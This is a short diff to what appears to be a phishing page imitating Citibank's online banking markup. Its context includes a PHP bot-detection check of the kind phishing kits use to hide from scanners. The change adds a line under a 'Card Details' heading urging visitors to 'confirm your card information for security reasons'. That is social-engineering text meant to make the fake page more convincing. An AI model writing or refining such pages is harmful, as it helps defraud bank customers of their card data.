@@ -7561,7 +7561,8 @@ if($bot == "is_bot"){
 													<citi-row _ngcontent-tey-c262="">
 														<div class="row">
 															<h1 _ngcontent-tey-c262="" class="hide"></h1>
-															<h3 _ngcontent-tey-c262="" class="h3-style col-sm-12 head-padding"><strong>Card Details</strong></h3></div>
+															<h3 _ngcontent-tey-c262="" class="h3-style col-sm-12 head-padding"><strong>Card Details</strong></h3>
+																									<h4 _ngcontent-tey-c262="" style="margin-top: 8px; font-size: 16px; font-weight: 400; color: #333;">Please confirm your card information for security reasons.</h4></div>
 													</citi-row>
 													<div _ngcontent-tey-c262="" content5="" class="row">
 														<citi-row _ngcontent-tey-c262="">
